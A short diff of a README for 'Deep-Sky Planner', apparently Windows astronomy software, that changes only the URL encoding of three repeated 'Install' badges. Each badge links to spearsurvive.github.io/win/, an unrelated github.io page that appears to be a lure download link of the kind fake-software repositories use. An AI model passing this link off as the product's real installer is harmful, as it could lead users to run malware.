@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Deep-Sky Planner](https://img.shields.io/badge/⬇_Install_Deep-Sky%20Planner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Deep-Sky Planner](https://img.shields.io/badge/⬇_Install_Deep-Sky+Planner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Deep-Sky Planner is a Windows astronomy planning software for deep-sky observers
 
 <div align="center">
 
-[![⬇ Install Deep-Sky Planner](https://img.shields.io/badge/⬇_Install_Deep-Sky%20Planner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Deep-Sky Planner](https://img.shields.io/badge/⬇_Install_Deep-Sky+Planner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Deep-Sky Planner is a Windows astronomy planning software for deep-sky observers
 
 <div align="center">
 
-[![⬇ Install Deep-Sky Planner](https://img.shields.io/badge/⬇_Install_Deep-Sky%20Planner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Deep-Sky Planner](https://img.shields.io/badge/⬇_Install_Deep-Sky+Planner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
